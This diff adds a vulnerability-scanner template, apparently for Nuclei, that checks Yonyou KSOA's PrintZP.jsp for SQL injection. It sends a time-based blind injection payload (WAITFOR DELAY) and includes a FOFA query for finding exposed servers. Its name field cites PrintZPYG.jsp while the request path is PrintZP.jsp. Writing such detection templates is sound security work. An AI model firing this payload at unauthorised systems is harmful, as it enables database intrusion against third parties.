@@ -1,0 +1,26 @@
+id: yonyou-KSOA-PrintZP-sqli
+
+info:
+  name: 用友时空KSOA系统接口PrintZPYG.jsp存在SQL注入漏洞
+  author: xx
+  severity: high
+  metadata:
+    fofa-query: app="用友-时空KSOA"
+  tags: yonyou,sqli
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /kp/PrintZP.jsp?zpfbbh=1%27%3BWAITFOR+DELAY+%270%3A0%3A3%27-- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
+    Connection: close
+
+
+  matchers-condition: and
+  matchers:
+        - type: dsl
+          dsl:
+            - 'duration>=3 && duration<8'
+          condition: and
